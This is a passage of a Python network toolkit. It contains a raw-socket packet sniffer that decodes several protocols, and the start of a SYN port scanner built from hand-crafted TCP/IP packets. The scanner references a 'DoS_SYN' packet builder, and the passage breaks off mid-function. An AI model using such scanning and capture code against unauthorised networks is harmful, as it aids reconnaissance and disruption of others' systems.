#!/usr/bin/python3
import socket
import asyncio
import struct
import queue
import signal
import ctypes
import binascii
import ssl
import sys
import os
import random
import time
import argparse


class Constant :
    MODULE : bool = __name__ != "__main__"
    ISROOT : bool = os.geteuid() == 0
    TIME : int = lambda : round(time.time())
    ISOS : bool = any([os in sys.platform for os in ("linux", "bsd", "darwin")])
    IFACES : list = [iface[-1] for iface in socket.if_nameindex()]
    COUNTER : int = ctypes.c_uint64
    SUP_COLOR : bool = True if (os.getenv("COLORTERM") in ("truecolor", "24bit", "color24")) and (os.getenv("NOCOLOR") in (None, 0, "false", "no")) else False
    SLASH : str = chr(47)
    ESCAPE : str = chr(27)
    TOOLS : dict = dict()
    FILES : list = list()
    INFO : tuple = (
        f"[System] : [{sys.platform.upper()}, {time.ctime()}]",
        f"[Hostname] : [{socket.gethostname()}, PID {os.getpid()}]",
        f"[Python] : [{sys.implementation.name.title()} {sys.version_info[0]}.{sys.version_info[1]}]",
        f"[GitHub] : [github.com/HI6Cypher]"
        )

    def SOURCE() -> str :
        try : host = socket.gethostbyname("_gateway")
        except : host = "192.168.0.0"
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock :
            sock.connect((host, 0))
            source = sock.getsockname()[0]
        return source

    def EXIT(code : int) -> None :
        sys.exit(code)
        return

    def SIGNAL(signum : int, stk_frm : "frame") -> None :
        func_name = stk_frm.f_code.co_name
        func_line = str(stk_frm.f_code.co_firstlineno)
        stack_size = str(stk_frm.f_code.co_stacksize)
        EXCEPTION : None = lambda error : print("\n\n[" + Constant.RED("!") + "]" + f" Error : {error or None}", file = sys.stderr)
        msg = Constant.RED(" **SIGNAL** ")
        msg += "\n\n" + f"sig_num : {Constant.YELLOW(signal.Signals(signum).name)}"
        for file in Constant.FILES :
            msg += "\n" + f"process_stat : closing file (name : {file.name}, mode : {file.mode})"
            if not file.closed : file.close()
            msg += " " + "closed"
        msg += "\n" + f"process_stat : func {Constant.YELLOW(func_name)} in line {Constant.YELLOW(func_line)} with stacksize {Constant.YELLOW(stack_size)}\n"
        EXCEPTION(msg)
        Constant.EXIT(1)
        return

    def RED(text : str) -> str :
        red = Constant.ESCAPE + "[31m"
        end = Constant.ESCAPE + "[0m"
        return red + text + end if Constant.SUP_COLOR else text

    def GREEN(text : str) -> str :
        green = Constant.ESCAPE + "[32m"
        end = Constant.ESCAPE + "[0m"
        return green + text + end if Constant.SUP_COLOR else text

    def YELLOW(text : str) -> str :
        yellow = Constant.ESCAPE + "[33m"
        end = Constant.ESCAPE + "[0m"
        return yellow + text + end if Constant.SUP_COLOR else text

    def STANDARDIZE_MAC(mac : bytes) -> str :
        return ":".join([f"{sec:02x}" for sec in mac])


class Sniff :
    def __init__(self, iface : str, tmp : bool, saddr : str, daddr : str, recvbuf : int, wait : float, verboss : bool) -> None :
        self.iface = iface
        self.tmp = tmp
        self.saddr = saddr
        self.daddr = daddr
        self.sock_recvbuf = recvbuf
        self.wait = wait
        self.verboss = verboss
        self.__counter = Constant.COUNTER(0)
        self.queue = queue.Queue()
        self.tmp_file = None
        return

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"Sniff : \n\t{self.iface}"

    @property
    def count(self) -> int :
        return self.__counter.value

    @count.setter
    def count(self, value : int) -> None :
        self.__counter.value = value
        return

    @staticmethod
    async def eth_header(raw_payload : bytes) -> tuple[str, str, str | int] :
        payload = struct.unpack("!6s6sH", raw_payload)
        standardize_mac_addr : str = lambda x : ":".join([f"{sec:02x}" for sec in x])
        dst = standardize_mac_addr(payload[0])
        src = standardize_mac_addr(payload[1])
        protos = {
            0x0800 : "IPv4",
            0x86dd : "IPv6",
            0x0806 : "ARP"
            }
        typ = protos.get(payload[2], payload[2])
        return (dst, src, typ)

    @staticmethod
    async def ipv4_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, int, int, int, int, str | int, int, str, str] :
        payload = struct.unpack("!BBHHHBBH4s4s", raw_payload[:20])
        ver = payload[0] >> 4
        ihl = (payload[0] & 0xf) * 4
        tos = payload[1]
        tln = payload[2]
        idn = payload[3]
        flg = payload[4] >> 13
        oft = payload[4] & 0x1fff
        ttl = payload[5]
        protos = {
            0x0001 : "ICMPv4",
            0x0006 : "TCP",
            0x0011 : "UDP",
            0x003a : "ICMPv6",
            0x0002 : "IGMP"
            }
        prt = protos.get(payload[6], payload[6])
        csm = payload[7]
        src = socket.inet_ntop(socket.AF_INET, payload[8])
        dst = socket.inet_ntop(socket.AF_INET, payload[9])
        return (ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst)

    @staticmethod
    async def ipv6_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, str | int, int, str, str] :
        payload = struct.unpack("!lHBB16s16s", raw_payload[:40])
        ver = payload[0] >> 28
        cls = (payload[0] >> 20) & 0xff
        flw = payload[0] & 0xfffff
        pln = payload[1]
        protos = {
            0x0001 : "ICMPv4",
            0x0006 : "TCP",
            0x0011 : "UDP",
            0x003a : "ICMPv6",
            0x0002 : "IGMP"
            }
        prt = protos.get(payload[2], payload[2])
        ttl = payload[3]
        src = socket.inet_ntop(socket.AF_INET6, payload[4])
        dst = socket.inet_ntop(socket.AF_INET6, payload[5])
        return (ver, cls, flw, pln, prt, ttl, src, dst)

    @staticmethod
    async def arp_header(raw_payload : memoryview | bytes) -> tuple[str | int, str | int, int, int, str | int, str, str, str, str] :
        payload = struct.unpack("!HHBBH6s4s6s4s", raw_payload[:28])
        standardize_mac_addr : str = lambda x : ":".join([f"{sec:02x}" for sec in x])
        hdr = "Ethernet(1)" if payload[0] == 1 else payload[0]
        protos = {
            0x0800 : "IPv4",
            0x86dd : "IPv6"
            }
        prt = protos.get(payload[1], payload[1])
        hln = payload[2]
        pln = payload[3]
        opcodes = {
            0x0001 : "ARP REQ",
            0x0002 : "ARP REP"
            }
        opc = opcodes.get(payload[4], payload[4])
        sha = standardize_mac_addr(payload[5])
        spa = socket.inet_ntop(socket.AF_INET, payload[6])
        tha = standardize_mac_addr(payload[7])
        tpa = socket.inet_ntop(socket.AF_INET, payload[8])
        return (hdr, prt, hln, pln, opc, sha, spa, tha, tpa)

    @staticmethod
    async def tcp_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, int, dict, int, int, int, memoryview | bytes] :
        payload = struct.unpack("!HHLLBBHHH", raw_payload[:20])
        src_p = payload[0]
        dst_p = payload[1]
        seq = payload[2]
        acn = payload[3]
        oft = (payload[4] >> 4) * 4
        flg = payload[5]
        urg = (flg & 32) >> 5
        ack = (flg & 16) >> 4
        psh = (flg & 8) >> 3
        rst = (flg & 4) >> 2
        syn = (flg & 2) >> 1
        fin = flg & 1
        flg = {
            "urg" : urg,
            "ack" : ack,
            "psh" : psh,
            "rst" : rst,
            "syn" : syn,
            "fin" :fin
                }
        win = payload[6]
        csm = payload[7]
        urg = payload[8]
        data = raw_payload[oft:]
        return (src_p, dst_p, seq, acn, oft, flg, win, csm, urg, data)

    @staticmethod
    async def udp_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, memoryview | bytes] :
        payload = struct.unpack("!HHHH", raw_payload[:8])
        src_p = payload[0]
        dst_p = payload[1]
        tln = payload[2]
        csm = payload[3]
        data = raw_payload[8:]
        return (src_p, dst_p, tln, csm, data)

    @staticmethod
    async def icmpv4_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, memoryview | bytes] :
        payload = struct.unpack("!BBH", raw_payload[:4])
        typ = payload[0]
        cod = payload[1]
        csm = payload[2]
        data = raw_payload[8:]
        return (typ, cod, csm, data)

    @staticmethod
    async def icmpv6_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, memoryview | bytes] :
        payload = struct.unpack("!BBH", raw_payload[:4])
        typ = payload[0]
        cod = payload[1]
        csm = payload[2]
        data = raw_payload[8:]
        return (typ, cod, csm, data)

    @staticmethod
    async def igmp_header(raw_payload : memoryview | bytes) -> \
        tuple[int, int, int, str] | \
        tuple[int, int, int, str, int, int, int, int, list] | \
        tuple[int, int, int, list[int, int, int, str, list[str], memoryview | bytes]] :
        match raw_payload[0] :
            case 0x12 | 0x16 | 0x17 :
                payload = struct.unpack("!BBH4s", raw_payload[:8])
                typ = payload[0]
                mrt = payload[1]
                csm = payload[2]
                gad = socket.inet_ntop(socket.AF_INET, payload[3])
                return (typ, mrt, csm, gad)
            case 0x11 :
                payload_before_src_addrs = struct.unpack("!BBH4sBBH", raw_payload[:12])
                payload = payload_before_src_addrs
                typ = payload[0]
                mrt = payload[1]
                csm = payload[2]
                gad = socket.inet_ntop(socket.AF_INET, payload[3])
                srp = payload[4] >> 3
                qrv = payload[4] & 0b111
                qic = payload[5]
                nos = payload[6]
                payload_after_src_addrs = struct.unpack("!" + nos * "4s", raw_payload[12:12 + nos * 4])
                src_addrs = [socket.inet_ntop(socket.AF_INET, src) for src in payload_after_src_addrs]
                return (typ, mrt, csm, gad, srp, qrv, qic, nos, src_addrs)
            case 0x22 :
                payload_before_group_records = struct.unpack("!BxHxxH", raw_payload[:8])
                payload = payload_before_group_records
                typ = payload[0]
                csm = payload[1]
                nog = payload[2]
                group_records = list()
                index = 8
                for _ in range(nog) :
                    payload_group_record_before_src_addrs = struct.unpack("!BBH4s", raw_payload[index:index + 8])
                    index += 8
                    payload = payload_group_record_before_src_addrs
                    rtp = payload[0]
                    adl = payload[1]
                    nos = payload[2]
                    mad = socket.inet_ntop(socket.AF_INET, payload[3])
                    payload_group_record_after_src_addrs = struct.unpack("!" + nos * "4s", raw_payload[index:index + nos * 4])
                    index += nos * 4
                    group_record_src_addrs = [socket.inet_ntop(socket.AF_INET, src) for src in payload_group_record_after_src_addrs]
                    data = raw_payload[index:index + adl * 4]
                    index += adl * 4
                    group_records.append((rtp, adl, nos, mad, group_record_src_addrs, data))
                else :
                    return (typ, csm, nog, group_records)
            case _ :
                payload = struct.unpack("!BBH4s", raw_payload[:8])
                typ = payload[0]
                mrt = payload[1]
                csm = hex(payload[2])
                gad = socket.inet_ntop(socket.AF_INET, payload[3])
                return (typ, mrt, csm, gad)

    @staticmethod
    async def indent_data(data : memoryview | bytes) -> str :
        data = data.tolist() if isinstance(data, memoryview) else list(data)
        for i in range(len(data)) :
            if (data[i] not in range(32, 127)) : data[i] = 46
        data.insert(0, 9)
        data.insert(0, 9)
        for i in range((len(data) // 64) + 1) :
            index = (i + 1) * 64
            data.insert(index, 9)
            data.insert(index, 9)
            data.insert(index, 10)
        else :
            data.insert(0, 10)
            data.insert(0, 9)
            data.insert(0, 9)
        return bytes(data).decode()

    async def parse_eth_header_verboss(self, data : memoryview | bytes) -> tuple[str, str | int] :
        parsed_header = str()
        t = "\n\t\t"
        dst, src, typ = await self.eth_header(data)
        parsed_header += f"Ethernet Frame :{t}Source MAC : {src}{t}Destination MAC : {dst}{t}Ethernet Type : {typ}"
        return (parsed_header, typ)

    async def parse_eth_header(self, data : memoryview | bytes) -> tuple[str, str | int] :
        parsed_header = str()
        dst, src, typ = await self.eth_header(data)
        parsed_header += f"Ethernet : Src:{src}|Dst:{dst}|Type:{typ}"
        return (parsed_header, typ)

    async def parse_ipv4_header_verboss(self, data : memoryview | bytes) -> tuple[str, int, str | int] :
        parsed_header = str()
        t = "\n\t\t"
        ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst = await self.ipv4_header(data)
        parsed_header += f"IPv4 Datagram :{t}Version : {ver}  Header Length : {ihl}  Time of Service : {tos}"
        parsed_header += f"{t}Total Length : {tln}  Identification : {idn}  Flags : {flg}"
        parsed_header += f"{t}Fragment Offset : {oft}  TTL : {ttl}  Protocol : {prt}"
        parsed_header += f"{t}Checksum : {hex(csm)}  Source : {src}  Destination : {dst}"
        return (parsed_header, ihl, prt)

    async def parse_ipv4_header(self, data : memoryview | bytes) -> tuple[str, int, str | int] :
        parsed_header = str()
        ver, ihl, _, _, idn, _, _, ttl, prt, _, src, dst = await self.ipv4_header(data)
        parsed_header += f"IPv4 : Ver:{ver}|Ident:{idn}|Proto:{prt}|Src:{src}|Dst:{dst}|TTL:{ttl}"
        return (parsed_header, ihl, prt)

    async def parse_ipv6_header_verboss(self, data : memoryview | bytes) -> tuple[str, int, str | int] :
        parsed_header = str()
        t = "\n\t\t"
        ver, cls, flw, pln, prt, ttl, src, dst = await self.ipv6_header(data)
        parsed_header += f"IPv6 Datagram :{t}Version : {ver}  Traffic Class : {cls}  Flow Lable : {flw}"
        parsed_header += f"{t}Payload Length : {pln}  Next Header : {prt}  Hop Limit : {ttl}"
        parsed_header += f"{t}Source : {src}"
        parsed_header += f"{t}Destination : {dst}"
        return (parsed_header, pln, prt)

    async def parse_ipv6_header(self, data : memoryview | bytes) -> tuple[str, int, str | int] :
        parsed_header = str()
        ver, _, flw, pln, prt, ttl, src, dst = await self.ipv6_header(data)
        parsed_header += f"IPv6 : Ver:{ver}|Src:{src}|Dst:{dst}\n\t"
        parsed_header += f"Flow:{flw}|Proto:{prt}|Hop:{ttl}"
        return (parsed_header, pln, prt)

    async def parse_arp_header_verboss(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        t = "\n\t\t"
        hdr, prt, hln, pln, opc, sha, spa, tha, tpa = await self.arp_header(data)
        parsed_header += f"Arp Datagram :{t}Hardware Type : {hdr}{t}Protocol Type : {prt}{t}Hardware Length : {hln}"
        parsed_header += f"{t}Protocol Length : {pln}{t}Opcode : {opc}{t}Sender Hardware Address : {sha}"
        parsed_header += f"{t}Sender Protocol Address : {spa}{t}Target Hardware Address : {tha}"
        parsed_header += f"{t}Target Protocol Address : {tpa}"
        return parsed_header

    async def parse_arp_header(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        _, _, _, _, _, sha, spa, tha, tpa = await self.arp_header(data)
        parsed_header += f"Arp : SrcMac:{sha}|SrcIP:{spa}|DstMac:{tha}|DstIP:{tpa}"
        return parsed_header

    async def parse_tcp_header_verboss(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        t = "\n\t\t"
        src_p, dst_p, seq, acn, oft, flg, win, csm, urg, data = await self.tcp_header(data)
        data = await self.indent_data(data)
        parsed_header += f"TCP Segment :{t}Source Port : {src_p}{t}Destination Port : {dst_p}{t}Sequence : {seq}{t}Acknowledgment : {acn}{t}Data Offset : {oft}{t}Flags :{t}\t"
        parsed_header += f"URG:{flg['urg']}  ACK:{flg['ack']}  PSH:{flg['psh']}{t}\tRST:{flg['rst']}  SYN:{flg['syn']}  FIN:{flg['fin']}{t}"
        parsed_header += f"Window : {win}{t}Checksum : {hex(csm)}{t}Urgent Pointer : {urg}{t}Raw Data :\n{data}"
        return parsed_header

    async def parse_tcp_header(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        src_p, dst_p, seq, acn, _, flg, _, _, _, _ = await self.tcp_header(data)
        parsed_header += f"TCP : Src:{src_p}|Dst:{dst_p}|Seq:{seq}|Acn:{acn}\n\t"
        parsed_header += f"Flags : URG:{flg['urg']} ACK:{flg['ack']} PSH:{flg['psh']} RST:{flg['rst']} SYN:{flg['syn']} FIN:{flg['fin']}"
        return parsed_header

    async def parse_udp_header_verboss(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        t = "\n\t\t"
        src_p, dst_p, tln, csm, data = await self.udp_header(data)
        data = await self.indent_data(data)
        parsed_header += f"UDP Segment :{t}Source Port : {src_p}{t}Destination Port : {dst_p}{t}Length : {tln}{t}Checksum : {hex(csm)}{t}Raw Data :\n{data}"
        return parsed_header

    async def parse_udp_header(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        src_p, dst_p, _, _, _ = await self.udp_header(data)
        parsed_header += f"UDP : Src:{src_p}|Dst:{dst_p}"
        return parsed_header

    async def parse_icmpv4_header_verboss(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        t = "\n\t\t"
        typ, cod, csm, data = await self.icmpv4_header(data)
        data = await self.indent_data(data)
        parsed_header += f"ICMPv4 Datagram :{t}Type : {typ}{t}Code : {cod}{t}Checksum : {hex(csm)}{t}Raw Data :\n{data}"
        return parsed_header

    async def parse_icmpv4_header(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        typ, cod, _, _ = await self.icmpv4_header(data)
        parsed_header += f"ICMPv4 : Type:{typ}|Code:{cod}"
        return parsed_header

    async def parse_icmpv6_header_verboss(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        t = "\n\t\t"
        typ, cod, csm, data = await self.icmpv4_header(data)
        data = await self.indent_data(data)
        parsed_header += f"ICMPv6 Datagram :{t}Type : {typ}{t}Code : {cod}{t}Checksum : {hex(csm)}{t}Raw Data :\n{data}"
        return parsed_header

    async def parse_icmpv6_header(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        typ, cod, _, _ = await self.icmpv4_header(data)
        parsed_header += f"ICMPv6 : Type:{typ}|Code:{cod}"
        return parsed_header

    async def parse_igmp_header_verboss(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        t = "\n\t\t"

        async def handle_codes(code : int) -> int :
            if (code < 128) :
                encoded = code
            if (code >= 128) :
                exp = (code >> 4) & 0b111
                mant = code & 0b1111
                encoded = (mant | 0x10) << (exp + 3)
            return encoded

        parsed_igmp_header = await self.igmp_header(data)
        match parsed_igmp_header[0] :
            case 0x12 | 0x16 | 0x17 :
                typ, mrt, csm, gad = parsed_igmp_header
                igmp_types = {
                    0x12 : "IGMPv1 Memship Report",
                    0x16 : "IGMPv2 Memship Report",
                    0x17 : "IGMPv2 Leave Group"
                    }
                parsed_header += f"{igmp_types[typ]} Datagram :{t}Type : {hex(typ)}{t}Max Response Time : {await handle_codes(mrt)}{t}"
                parsed_header += f"Checksum : {hex(csm)}{t}Group Address : {gad}"
                return parsed_header
            case 0x11 :
                typ, mrt, csm, gad, srp, qrv, qic, nos, src_addrs = parsed_igmp_header
                parsed_header += f"IGMP Memship Query Datagram :{t}Type : {hex(typ)}{t}Max Response Time : {await handle_codes(mrt)}{t}"
                parsed_header += f"Group Address : {gad}{t}S-Flag : {srp}{t}QRV : {qrv}{t}Checksum : {hex(csm)}{t}"
                parsed_header += f"QQI : {await handle_codes(qic)}{t}Number of Sources : {nos}{t}Source Addresses{t}\t"
                parsed_header += (t + "\t").join(src_addrs)
                return parsed_header
            case 0x22 :
                typ, csm, nog, group_records = parsed_igmp_header
                parsed_header += f"IGMPv3 Memship Report Datagram :{t}Type : {hex(typ)}{t}"
                parsed_header += f"Checksum : {hex(csm)}{t}Number of Group Records : {nog}{t}Group Records :{t}\t"
                record_types = {
                    1 : "MODE_IS_INCLUDE",
                    2 : "MODE_IS_EXCLUDE",
                    3 : "CHANGE_TO_INCLUDE_MODE",
                    4 : "CHANGE_TO_EXCLUDE_MODE",
                    5 : "ALLOW_NEW_SOURCES",
                    6 : "BLOCK_OLD_SOURCES"
                    }
                for index, group in enumerate(group_records) :
                    rtp, adl, nos, mad, src_addrs, data = group
                    parsed_header += f"Group_record({index}) :{t}\t\tRecord Type : {record_types[rtp]}[{rtp}]{t}\t\tAux Data Length : {adl}{t}\t\t"
                    parsed_header += f"Number of Sources : {nos}{t}\t\tMulticast Address : {mad}{t}\t\tSource Addresses :{t}\t\t\t"
                    parsed_header += (t + "\t\t\t").join(src_addrs)
                    parsed_header += f"{t}\t\tData : {t}\t\t\t{await self.indent_data(data)}"
                    parsed_header += t + "\t"
                else : return parsed_header

            case _ :
                typ, mrt, csm, gad = parsed_igmp_header
                parsed_header += f"IGMP Unkown Datagram :{t}Type : {hex(typ)}{t}Max Response Time : {await handle_codes(mrt)}{t}"
                parsed_header += f"Checksum : {hex(csm)}{t}Group Address : {gad}"
                return parsed_header

    async def parse_igmp_header(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        parsed_igmp_header = await self.igmp_header(data)
        match parsed_igmp_header[0] :
            case 0x12 | 0x16 | 0x17 :
                typ, _, _, gad = parsed_igmp_header
                igmp_types = {
                    0x12 : "IGMPv1 Memship Report",
                    0x16 : "IGMPv2 Memship Report",
                    0x17 : "IGMPv2 Leave Group"
                    }
                parsed_header += f"{igmp_types[typ]} : Type:{hex(typ)}|Group:{gad}"
                return parsed_header
            case 0x11 :
                typ, _, _, gad, _, _, _, nos, _ = parsed_igmp_header
                parsed_header += f"IGMP Memship Query : Type:{hex(typ)}|Group:{gad}|Number:{nos}"
                return parsed_header
            case 0x22 :
                typ, _, nog, _ = parsed_igmp_header
                parsed_header += f"IGMPv3 Memship Report : Type:{hex(typ)}|Number:{nog}"
                return parsed_header
            case _ :
                typ, _, _, gad = parsed_igmp_header
                parsed_header += f"IGMP Unknown : Type:{hex(typ)}|Group:{gad}"
                return parsed_header

    async def parse_headers(self, raw_data : memoryview | bytes) -> str :
        parsed_headers = str()
        spec_header = f"[{self.count}][DATALINK_FRAME]________________{Constant.TIME()}________________"
        saperator = "\n\n" if self.verboss else "\n"
        self.count += 1
        eth_data = raw_data[:14]
        parsed_eth_header, typ = await self.parse_eth_header_verboss(eth_data) if self.verboss else await self.parse_eth_header(eth_data)
        match typ :
            case "IPv4" :
                ip_data = raw_data[14:]
                parsed_ip_header, ihl, prt = await self.parse_ipv4_header_verboss(ip_data) if self.verboss else await self.parse_ipv4_header(ip_data)
                match prt :
                    case "TCP" :
                        tcp_data = raw_data[14 + ihl:]
                        next_layer_header = await self.parse_tcp_header_verboss(tcp_data) if self.verboss else await self.parse_tcp_header(tcp_data)
                    case "UDP" :
                        udp_data = raw_data[14 + ihl:]
                        next_layer_header = await self.parse_udp_header_verboss(udp_data) if self.verboss else await self.parse_udp_header(udp_data)
                    case "ICMPv4" :
                        icmp_data = raw_data[14 + ihl:]
                        next_layer_header = await self.parse_icmpv4_header_verboss(icmp_data) if self.verboss else await self.parse_icmpv4_header(icmp_data)
                    case "ICMPv6" :
                        icmp_data = raw_data[14 + ihl:]
                        next_layer_header = await self.parse_icmpv6_header_verboss(icmp_data) if self.verboss else await self.parse_icmpv6_header(icmp_data)
                    case "IGMP" :
                        igmp_data = raw_data[14 + ihl:]
                        next_layer_header = await self.parse_igmp_header_verboss(igmp_data) if self.verboss else await self.parse_igmp_header(igmp_data)
                    case _ :
                        next_layer_header = f"{prt} : unimplemented transport layer protocol"
                parsed_headers += spec_header
                parsed_headers += saperator
                parsed_headers += parsed_eth_header
                parsed_headers += saperator
                parsed_headers += parsed_ip_header
                parsed_headers += saperator
                parsed_headers += next_layer_header
                parsed_headers += saperator
                return parsed_headers
            case "IPv6" :
                ip_data = raw_data[14:]
                parsed_ip_header, pln, prt = await self.parse_ipv6_header(ip_data)
                match prt :
                    case "TCP" :
                        tcp_data = raw_data[14 + 40:]
                        next_layer_header = await self.parse_tcp_header_verboss(tcp_data) if self.verboss else await self.parse_tcp_header(tcp_data)
                    case "UDP" :
                        udp_data = raw_data[14 + 40:]
                        next_layer_header = await self.parse_udp_header_verboss(udp_data) if self.verboss else await self.parse_udp_header(udp_data)
                    case "ICMPv4" :
                        icmp_data = raw_data[14 + 40:]
                        next_layer_header = await self.parse_icmpv4_header_verboss(icmp_data) if self.verboss else await self.parse_icmpv4_header(icmp_data)
                    case "ICMPv6" :
                        icmp_data = raw_data[14 + 40:]
                        next_layer_header = await self.parse_icmpv6_header_verboss(icmp_data) if self.verboss else await self.parse_icmpv6_header(icmp_data)
                    case "IGMP" :
                        igmp_data = raw_data[14 + 40:]
                        next_layer_header = await self.parse_igmp_header_verboss(igmp_data) if self.verboss else await self.parse_igmp_header(igmp_data)
                    case _ :
                        next_layer_header = f"{prt} : unimplemented transport layer protocol"
                parsed_headers += spec_header
                parsed_headers += saperator
                parsed_headers += parsed_eth_header
                parsed_headers += saperator
                parsed_headers += parsed_ip_header
                parsed_headers += saperator
                parsed_headers += next_layer_header
                parsed_headers += saperator
                return parsed_headers
            case "ARP" :
                arp_data = raw_data[14:]
                parsed_arp_header = await self.parse_arp_header_verboss(arp_data) if self.verboss else await self.parse_arp_header(arp_data)
                parsed_headers += spec_header
                parsed_headers += saperator
                parsed_headers += parsed_eth_header
                parsed_headers += saperator
                parsed_headers += parsed_arp_header
                parsed_headers += saperator
                return parsed_headers
            case _ :
                parsed_headers += spec_header
                parsed_headers += saperator
                parsed_headers += parsed_eth_header
                parsed_headers += saperator
                parsed_headers += f"{typ} : unimplemented network layer protocol"
                parsed_headers += saperator
                return parsed_headers

    async def check_interface(self) -> None :
        ifaces = Constant.IFACES
        if (self.iface not in ifaces) :
            raise OSError(f"{self.iface} not in {ifaces}")
        self.iface = self.iface.encode()
        return

    async def check_ip(self, frame : memoryview | bytes) -> bool :
        typ = bytes(frame[12:14]).hex()
        return typ == "0800"

    async def check_saddr_ip(self, frame : memoryview | bytes) -> bool :
        src = ".".join((str(i) for i in tuple(frame[14:][12:16])))
        return src == self.saddr

    async def check_daddr_ip(self, frame : memoryview | bytes) -> bool :
        dst = ".".join((str(i) for i in tuple(frame[14:][16:20])))
        return dst == self.daddr

    async def check_eth_p_all(self) -> None :
        if ("ETH_P_ALL" not in socket.__all__) :
            socket.ETH_P_ALL = 3
        return

    async def filter(self, frame : memoryview | bytes) -> bool :
            nonce = 0
            if not (self.saddr or self.daddr) :
                return True
            if not await self.check_ip(frame) :
                return False
            if self.saddr :
                nonce += 1 if await self.check_saddr_ip(frame) else -1
            if self.daddr :
                nonce += 1 if await self.check_daddr_ip(frame) else -1
            if (nonce > 0) :
                return True
            else : return False

    async def outputctl(self) -> None :
        loop = asyncio.get_event_loop()
        while True :
            if not self.queue.empty() :
                frame = self.queue.get()
                filter = await self.filter(frame)
                if filter :
                    parsed_header = await self.parse_headers(frame)
                    parsed_header = parsed_header.expandtabs(4)
                    if self.tmp :
                        await asyncio.to_thread(self.write, parsed_header)
                    loop.call_soon(print, parsed_header)
            else : await asyncio.sleep(self.wait)
        return

    def write(self, data : str) -> None :
        self.tmp_file.write(data)
        return

    async def create_file(self) -> "file" :
        path = f"captured_{Constant.TIME()}.txt"
        mode = "a" if os.path.exists(path) else "x"
        file = open(path, mode)
        Constant.FILES.append(file)
        return file

    async def sniff(self) -> None :
        await self.check_interface()
        await self.check_eth_p_all()
        if self.tmp :
            async_file = await self.create_file()
            self.tmp_file = async_file
        await asyncio.gather(
            asyncio.create_task(self.__sniff()),
            asyncio.create_task(self.outputctl())
            )
        return

    async def __sniff(self) -> None :
        with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(socket.ETH_P_ALL)) as sniff :
            sniff.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, self.iface)
            sniff.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, self.sock_recvbuf)
            sniff.setblocking(False)
            while True :
                loop = asyncio.get_event_loop()
                raw_data, _ = await loop.sock_recvfrom(sniff, 0xffff)
                raw_data_memview = memoryview(raw_data)
                if raw_data : self.queue.put(raw_data_memview)
        return


class Scan :
    def __init__(self, host : str, timeout : float, event_loop : "async_event_loop") -> None :
        self.host = host
        self.timeout = timeout
        self.loop = event_loop
        self.source = Constant.SOURCE()
        self.ipv4_static_header = self.ipv4_header()
        self.opens = list()
        self.unspecified = list()
        return

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"Scan : \n\t{self.host}\n\t{self.port}\n\t{self.timeout}"

    @staticmethod
    def is_open_port(tcp_header : bytes) -> bool :
         flags = tcp_header[13:14]
         ack_syn = bytes(flags).hex() == "12"
         return True if ack_syn else False

    @staticmethod
    def check_acknum(acn : int, tcp_header : bytes) -> bool :
        acknum_byte = tcp_header[8:12]
        return True if (int(bytes(acknum_byte).hex(), base = 16) - 1 == acn) else False

    @staticmethod
    def ip_header(src : str, dst : str, idn : int = 0, csm : int = 0) -> bytes :
        return DoS_SYN.ip_header(src = src, dst = dst, idn = idn, csm = csm)

    @staticmethod
    def tcp_header(src_p : int = 0, dst_p : int = 0, seq : int = 0, syn = 0, csm : int = 0) -> bytes :
        return DoS_SYN.tcp_header(src_p = src_p, dst_p = dst_p, seq = seq, syn = 1, csm = csm)

    @staticmethod
    def pseudo_header(src : str, dst : str, pln : int = 0) -> bytes :
        return DoS_SYN.pseudo_header(src = src, dst = dst, pln = pln)

    @staticmethod
    def checksum(data : bytes) -> int :
        return DoS_SYN.checksum(data)

    def ipv4_header(self) -> bytes :
        src = socket.inet_pton(socket.AF_INET, self.source)
        dst = socket.inet_pton(socket.AF_INET, self.host)
        randidn = random.randint(1024, 0xffff)
        header = self.ip_header(src = src, dst = dst, idn = randidn)
        checksum_ip_header = self.checksum(header)
        header = self.ip_header(src = src, dst = dst, idn = randidn, csm = checksum_ip_header)
        return header

    def tcpip_header(self, port : int) -> tuple[bytes, int] :
        src = socket.inet_pton(socket.AF_INET, self.source)
        dst = socket.inet_pton(socket.AF_INET, self.host)
        src_p = random.randint(1024, 0xffff)
        dst_p = port
        randseq = random.randint(0, 0xffff)
        header = self.tcp_header(src_p = src_p, dst_p = dst_p, seq = randseq, syn = 1)
        pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(header))
        checksum_tcp_header = self.checksum(header + pseudo_header)
        header = self.tcp_header(src_p = src_p, dst_p = dst_p, seq = randseq, syn = 1, csm = checksum_tcp_header)
        return (header, randseq)

    async def package(self, port : int) -> tuple[bytes, int] :
        ip_header = self.ipv4_static_header
        tcp_header = self.tcpip_header(port)
        payload = ip_header + tcp_header[0]
        return (payload, tcp_header[1])

    async def send(self, port : int) -> tuple[bool, bytes | None] :
        try :
            payload = await self.package(port)
            async with asyncio.timeout(self.timeout) :
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as scan :
